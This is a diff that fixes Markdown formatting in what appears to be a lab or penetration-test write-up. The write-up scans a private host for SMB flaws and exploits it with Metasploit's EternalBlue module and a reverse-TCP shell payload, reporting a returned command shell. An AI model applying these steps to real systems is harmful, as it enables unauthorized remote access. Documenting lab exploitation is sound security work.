@@ -46,12 +46,12 @@ nmap -p 445 --script smb-vuln\* 10.82.189.71
 
 **Exploitation Steps:**
 
-**Module Selection:** I selected `exploit/windows/smb/ms17\_010\_eternalblue`.
+**Module Selection:** I selected `exploit/windows/smb/ms17_010_eternalblue`.
 
 **Configuration:**
 
 * Set **RHOSTS** to 10.82.189.71.
-* Set **PAYLOAD** to `windows/x64/shell/reverse\_tcp` to catch a stable shell.
+* Set **PAYLOAD** to `windows/x64/shell/reverse_tcp` to catch a stable shell.
 
 **Execution:** Ran the exploit, which successfully triggered the buffer overflow and returned a command shell.
 
